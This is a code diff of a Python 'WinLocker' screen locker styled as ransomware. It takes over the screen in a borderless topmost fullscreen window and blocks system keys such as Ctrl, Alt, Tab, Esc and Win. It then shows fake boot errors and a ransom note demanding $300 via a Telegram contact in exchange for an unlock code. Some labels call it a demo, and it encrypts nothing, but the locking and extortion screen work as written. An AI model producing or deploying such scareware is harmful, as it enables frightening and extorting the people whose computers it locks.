@@ -1,28 +1,38 @@
 
-from tkinter import *
-from tkinter import messagebox
+import tkinter as tk
 import random
+import winsound
+import keyboard
 
-WHITE = "white"
-RED = "red"
-BLACK = "black"
-BLUE = "blue"
+BLACK = "#000000"
+WHITE = "#ffffff"
+RED = "#ff0000"
+BLUE = "#0000f4"
+GREEN = "#9cc9b5"
+ORANGE = "#fefefe"
 
-password = "ziD#^TafeOaRjI^9Z@aK"
+password = "1234"
 
-root = Tk()
-root.title("WinLock")
-root.attributes("-topmost", True)
-
-w = root.winfo_screenwidth()
-h = root.winfo_screenheight()
-
-root.geometry(f"{w}x{h}")
+root = tk.Tk()
+root.title("WinLocker")
 root.configure(bg=BLACK)
 root.attributes("-fullscreen", True)
+root.attributes("-topmost", True)
+root.overrideredirect(True)
+
+root.update_idletasks()
+x = (root.winfo_screenwidth() - 900) // 2
+y = (root.winfo_screenheight() - 520) // 2
+root.geometry(f"900x520+{x}+{y}")
+
+keyboard.block_key('tab')
+keyboard.block_key('esc')
+keyboard.block_key('win')
+keyboard.block_key('alt')
+keyboard.block_key('ctrl')
 
 lines = [
-    "Booting windows...",
+    "Booting Windows...",
     "Boot error: 0x03527737",
     "Boot error: 0x0266712",
     "Boot error: 0x02897593",
@@ -32,38 +42,52 @@ lines = [
     "Boot error: 0x0700882",
     "Boot error: 0x03803618",
     "Memory section at address 0x0424* is locked!",
-    "Service UCRYPTED started.",
+    "Service UNCRYPTED started.",
     "",
-    "  * Windows blocked!"
+    "   Windows blocked!"
 ]
 
 labels = []
 
+boot_frame = tk.Frame(root, bg=BLACK)
+boot_frame.pack(fill="both", expand=True)
+
+def block(event):
+    return "break"
+
+for key in ["Control_L", "Control_R",
+            "Alt_L", "Alt_R",
+            "Tab", "Super_L", "Super_R"]:
+    root.bind_all(f"<{key}>", block)
+
+def tv_switch_sound():
+    winsound.Beep(1400, 70)
+
+
 for line in lines:
-    label = Label(
-        root,
-        text=line,
-        font=("Courier New", 16, "bold"),
+    label = tk.Label(
+        boot_frame,
+        text="",
+        font=("Courier New", 15, "bold"),
         fg=WHITE,
         bg=BLACK,
         anchor="w"
     )
+    label.pack(anchor="w", padx=10, pady=0)
     labels.append(label)
 
 
 def show_line(index):
-    if index >= len(labels):
-
-        root.after(300, turn_red)
+    if index >= len(lines):
+        root.after(500, turn_red)
         return
 
-    label = labels[index]
-    label.place(x=10, y=10 + index * 25)
+    labels[index].config(text=lines[index])
 
     if "Boot error" in lines[index]:
-        delay = random.randint(20, 60)
+        delay = random.randint(25, 45)
     else:
-        delay = random.randint(200, 400)
+        delay = random.randint(100, 200)
 
     root.after(delay, lambda: show_line(index + 1))
 
@@ -72,110 +96,200 @@ def turn_red():
     for label in labels:
         label.config(fg=RED)
 
-def check_password():
-    entered_password = password_entry.get()
+    root.after(1000, death_screen)
 
-    if entered_password == password:
-        messagebox.showinfo(
-            "Password correct."
-        )
-        root.destroy()
-    else:
-        messagebox.showerror(
-            "Помилка",
-            "Неправильний пароль!"
-        )
-        password_entry.delete(0, END)
-        password_entry.focus_set()
+def death_screen():
+    boot_frame.destroy()
+    root.configure(bg=RED)
+
+    death = r"""
+                                       .
+                                  .. . . . . ..
+                                  .. . . . . ..
+                              .. . .   . .    . .
+                              .. . . . . .   ....
+                          . . ...... . .
+                          . . ......            . .
+                        . . . .... . .            .
+                        . . . .... . .            . .
+                        .         .. .                                        0OO00OO
+                     .. . . . ....                  .                        0OO00OO00
+                     .. .   . ..                    .                        OO00OO0 OO
+                     ..     . ..  .                 .                      .OO00OO00OO00
+                      . . . . ..  ..                .                      .O00OO00OO0 O
+                     .. . . . ......                .                    ...00OO00OO00OO00O
+                     .. . . . ......                .                    ///0OO00OO00OO00OO
+                      .   . . .. ... .            . .                     // O00OO00OO00OO00O
+                   .... . . . ...... .            .                      //  00OO00OO00OO00OO
+                    ..               .                                  //    OO  OO00OO00OO00OO0
+               . ...... . . . ......       . .. . . .                  //    OO   O00OO00OO00OO00
+             .   .... .        .   .   .   .... . . .                 //    OO0   00OO00 O 0 O00O
+                 ...... . . . .. . . . .   .  . . . . .              //     O           O00OO00OO00
+           .     ...... . . . .. . . . . . . .. . . . . ..          //    //0           00OO00OO00O
+           . . . ...... . . . .... . . . . . .. . . . . ..         //     //                0OO00OO00O
+         . . . . ...... . . . .. . . . . . . .. . . . . .. .       /     //                 OO00OO00OO
+      .. . . .   .... .     . ...... . .   . .. . . . . .     ..///    //                     0OO00OO00O
+      ..   .      .   .     . ......   . . ....   . . . ..   ...//     //                     OO00OO00OO
+      .. . . . . ...... .   . .... . . . . .  . . . .   .  . .../     //                         OO00OO00O
+      ..   . . . .... . .   . ...... . . . .... . . .   .. . .../    //                          O00OO00OO
+                            .              . ..         ..     ./   //                             OO00 O0
+      .  .   . . .... . . .   .. . . . . . .  . .   . . .. . .../  //                              O00OO00
+      .. .       .... .     . ..   .   . . .  .     . .  . .  ..////                               00OO00O
+         .   . . .... . .     ..   . . . . .    . . . . .. . ...///                                0OO00OO
+         .       ......       ...... . . . .    . . . . .  . ...//                                 OO00OO0
+         . . .   ...... . . . .... . .   . .  . . . . . .. . ...///                                  0OO00
+         . . .   ...... . . . ..  .. .   . .  . . . . . .    ...///                                  OO00O
+         . . . .   .... . . . ....   .   . .  . . . . .  . .   .///                                  O00OO
+         . . . .   .... . . . ....   . . . .  . . . . . .. . . .///                                  00OO0
+                                     .              . . .        //                                  0OO
+           .   . ....   . . . ..  .. . . . .  . . .     .. . . .///                                  OO0
+           .      ...   .   .  .   .     .   ..   ..     . . . . //                                   0
+             .   ......   . . ..   . . . . .     ..     ..     .///
+             . . ......   . . .... . . . . .    ...    ..      ...
+             . . .... . .   . .. ... . . .      .     ..        ...
+                  . . .     .          .       ..     .         ...
+    """
+
+    tk.Label(
+        root,
+        text=death,
+        font=("Courier New", 11, "bold"),
+        fg=WHITE,
+        bg=RED,
+        justify="left",
+        anchor="nw"
+    ).place(x=10, y=5)
+
+    def transition():
+        tv_switch_sound()
+        show_menu()
+
+    root.after(1800, transition)
 
 def show_menu():
     root.configure(bg=BLUE)
 
-    frame = Frame(
-        root,
+    for widget in root.winfo_children():
+        widget.destroy()
+
+    main = tk.Frame(root, bg=BLUE)
+    main.place(relx=0.5, rely=0.5, anchor="center",
+               width=770, height=350)
+
+    title = tk.Label(
+        main,
+        text="Oops, your files are encrypted!",
+        font=("Courier New", 12, "bold"),
+        fg=BLACK,
+        bg=WHITE
+    )
+    title.place(relx=0.5, y=0, anchor="n",
+                width=320, height=25)
+
+    info = tk.Frame(
+        main,
         bg=BLUE,
-        highlightbackground=RED,
-        highlightthickness=3,
-        padx=45,
-        pady=30
+        highlightbackground=GREEN,
+        highlightthickness=2
     )
-    frame.place(relx=0.5, rely=0.5, anchor="center")
+    info.place(x=0, y=25, width=770, height=145)
 
-    Label(
-        frame,
-        text="WINLOCKER",
-        font=("Consolas", 25, "bold"),
-        fg=WHITE,
+    tk.Label(
+        info,
+        text=(
+            "Your windows is blocked and your files are encrypted.\n"
+            "Pay 300$ to get password to unblock your windows."
+        ),
+        font=("Courier New", 12, "bold"),
+        fg=ORANGE,
+        bg=BLUE,
+        justify="left",
+        anchor="w"
+    ).place(x=8, y=35)
+
+    tk.Label(
+        info,
+        text="To get the code, write in Telegram: @example_bot",
+        font=("Courier New", 12, "bold"),
+        fg=ORANGE,
         bg=BLUE
-    ).pack(pady=(0, 25))
+    ).place(x=8, y=115)
 
-    Label(
-        frame,
-        text="Ваші файли зашифровані!",
-        font=("Consolas", 22, "bold"),
-        fg=WHITE,
-        bg=BLUE
-    ).pack(pady=(0, 25))
-
-    Label(
-        frame,
-        text="Демонстраційний екран WinLocker",
-        font=("Consolas", 14),
-        fg=WHITE,
-        bg=BLUE
-    ).pack(pady=(0, 30))
-
-    Label(
-        frame,
-        text="Введіть код розблокування:",
-        font=("Consolas", 15),
-        fg=WHITE,
-        bg=BLUE
-    ).pack(pady=(0, 12))
-
-    global password_entry
-
-    password_entry = Entry(
-        frame,
-        font=("Consolas", 18),
-        bg="#FFFFFF",
-        fg=BLUE,
-        insertbackground=BLUE,
-        relief=FLAT,
-        width=30,
-        show="*"
+    password_frame = tk.Frame(
+        main,
+        bg=BLUE,
+        highlightbackground=GREEN,
+        highlightthickness=2
     )
-    password_entry.pack(pady=(0, 25), ipady=9)
+    password_frame.place(x=0, y=175, width=770, height=100)
 
-    Button(
-        frame,
-        text="ENTER",
-        font=("Consolas", 15, "bold"),
+    tk.Label(
+        password_frame,
+        text="Enter the unlock code:",
+        font=("Courier New", 13, "bold"),
+        fg=WHITE,
+        bg=BLUE
+    ).pack(pady=(3, 2))
+
+    entry = tk.Entry(
+        password_frame,
+        font=("Courier New", 17, "bold"),
         bg=WHITE,
         fg=BLUE,
-        activebackground="#ffffff",
-        activeforeground=BLUE,
-        relief=FLAT,
-        cursor="hand2",
-        command=check_password,
-        padx=35,
-        pady=10
-    ).pack()
-
-    password_entry.bind(
-        "<Return>",
-        lambda event: check_password()
+        insertbackground=BLUE,
+        justify="center",
+        relief="flat"
     )
-    password_entry.focus_set()
+    entry.pack(fill="x", padx=5, ipady=2)
 
+    tk.Label(
+        main,
+        text="Current PC: DEMO-7F3A-92BC",
+        font=("Courier New", 10),
+        fg=WHITE,
+        bg=BLUE
+    ).place(x=0, y=282)
 
-def Quit():
-    pass
+    result = tk.Label(
+        main,
+        text="",
+        font=("Courier New", 10, "bold"),
+        fg=WHITE,
+        bg=BLUE
+    )
+    result.place(x=0, y=310)
 
+    def check_password():
+        if entry.get() == password:
+            result.config(
+                text="DEMO UNLOCKED!",
+                fg="#00ff66"
+            )
+            root.destroy()
+        else:
+            result.config(
+                text="Incorrect code!",
+                fg=WHITE
+            )
+            entry.delete(0, tk.END)
 
-root.protocol("WM_DELETE_WINDOW", Quit)
+    button = tk.Button(
+        main,
+        text="Enter",
+        font=("Courier New", 12, "bold"),
+        fg=BLUE,
+        bg=WHITE,
+        activeforeground=BLUE,
+        activebackground="#cccccc",
+        relief="flat",
+        command=check_password,
+        cursor="hand2"
+    )
+    button.place(x=610, y=282, width=160, height=28)
+
+    entry.bind("<Return>", lambda event: check_password())
+    entry.focus_set()
 
 show_line(0)
-root.after(2300, show_menu)
 
 root.mainloop()
